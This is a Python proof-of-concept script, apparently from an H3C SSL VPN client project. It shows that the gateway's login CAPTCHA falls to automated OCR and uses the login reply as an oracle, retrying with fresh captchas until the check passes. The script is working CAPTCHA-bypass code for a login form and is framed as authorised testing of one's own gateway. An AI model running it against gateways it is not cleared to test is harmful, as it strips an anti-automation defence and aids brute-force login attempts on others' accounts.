#!/usr/bin/env python3
"""captcha_lab.py — standalone PoC for the H3C SSL VPN CAPTCHA weakness.

Authorised security testing only (your own gateway). Demonstrates that the
gateway's BMP validation image is defeated by automated OCR, using the login
reply as a success oracle. Pure-stdlib + the project's `h3csvpn.captcha` module
(which shells out to `tesseract`); no PIL/numpy/scipy.

Usage:
    python captcha_lab.py reliable [HOST:PORT] [USER] [PASS] [max_tries]
        Fetch -> auto-solve -> submit, retrying with a FRESH captcha until the
        gateway stops replying "Verify code error". Attempts that miss the
        captcha never reach the password check, so this passes the captcha with
        minimal real auth attempts and reveals the true credential outcome.

    python captcha_lab.py accuracy [HOST:PORT] [N]
        Fetch N captchas and report the solver's 4-char hit-rate (NO logins).

This is the "find a flaw and use it" deliverable; the same capability is wired
into the client itself (see `h3csvpn/captcha.py`, enabled with --auto-captcha).
"""
import getpass
import sys
from xml.etree import ElementTree as ET

from h3csvpn import constants as C
from h3csvpn import protocol as P
from h3csvpn import captcha as cap
from h3csvpn.crypto import urlencode_body
from h3csvpn.transport import TLSConfig, tls_connect

# No defaults: target and credentials are always supplied interactively or via
# argv, and never stored in this file (it ships in a public repository).
DEF_HOSTPORT = "vpn.example.com:443"   # placeholder — override: your OWN gateway only


def _ask(prompt, secret=False):
    if secret:
        return getpass.getpass(prompt)
    return input(prompt).strip()


def _conn(hostport):
    host, _, port = hostport.partition(":")
    conn = tls_connect(host, int(port or 3000), TLSConfig(verify=False))
    try:
        r = conn.get(C.PATH_INDEX, ua=C.UA_V7)
        if r.is_redirect:
            r = conn.get(_path_of(r.header("Location")), ua=C.UA_V7, cookies=True)
        gw = P.parse_gatewayinfo(r.text)
        return conn, gw
    except BaseException:
        conn.close()
        raise


def _path_of(url):
    # The gateway may send an absolute redirect; only the path may go on the
    # request line of our raw HTTP/1.1 client.
    if url.startswith(("http://", "https://")):
        from urllib.parse import urlsplit
        sp = urlsplit(url)
        return sp.path + (("?" + sp.query) if sp.query else "")
    return url if url.startswith("/") else "/" + url


def _fetch_captcha(conn, gw):
    img = conn.get(gw.vldimg_url, ua=C.UA_V7, cookies=True,
                   headers=[("Accept", "*/*")])
    return img.body


def _login(conn, gw, user, pw, code):
    xml = P.build_login_xml(username=user, password=pw, vld_code=code)
    resp = conn.post(_path_of(gw.login_url), urlencode_body(xml), ua=C.UA_V7,
                     cookies=True)
    return P.parse_login_result(resp.text)


def reliable(hostport=None, user=None, pw=None, max_tries=12):
    # Interactive prompts for anything not given on argv — credentials are
    # never echoed and never hardcoded.
    hostport = hostport or _ask(f"Gateway [{DEF_HOSTPORT}]: ") or DEF_HOSTPORT
    user = user or _ask("Username: ")
    pw = pw or _ask("Password: ", secret=True)
    if not user or not pw:
        print("[!] username and password are required")
        return
    for i in range(int(max_tries)):
        conn, gw = _conn(hostport)
        try:
            code = cap.solve(_fetch_captcha(conn, gw)) or ""
            res = _login(conn, gw, user, pw, code)
        finally:
            conn.close()
        passed = "verify code" not in (res.reply_message or "").lower()
        print(f"[try {i}] ocr={code!r:8} captcha_passed={passed} "
              f"reply={res.reply_message!r}")
        if passed:
            print(f"\n[+] CAPTCHA DEFEATED automatically after {i+1} attempt(s) "
                  f"(code {code!r}).")
            print(f"[=] post-captcha result={res.result!r} success={res.is_success}")
            return
    print(f"[!] not solved within {max_tries} tries")


def accuracy(hostport=None, n=12):
    hostport = hostport or _ask(f"Gateway [{DEF_HOSTPORT}]: ") or DEF_HOSTPORT
    hits = 0
    for i in range(int(n)):
        conn, gw = _conn(hostport)
        try:
            code = cap.solve(_fetch_captcha(conn, gw)) or ""
        finally:
            conn.close()
        ok = len(code) == 4
        hits += ok
        print(f"[{i}] {code!r:8} {'4-char' if ok else 'partial'}")
    print(f"\n4-char solve rate: {hits}/{n}")


if __name__ == "__main__":
    cmds = {"reliable": reliable, "accuracy": accuracy}
    if len(sys.argv) < 2 or sys.argv[1] not in cmds:
        print("usage: captcha_lab.py {reliable|accuracy} [HOST:PORT] ...")
        raise SystemExit(2)
    cmds[sys.argv[1]](*sys.argv[2:])
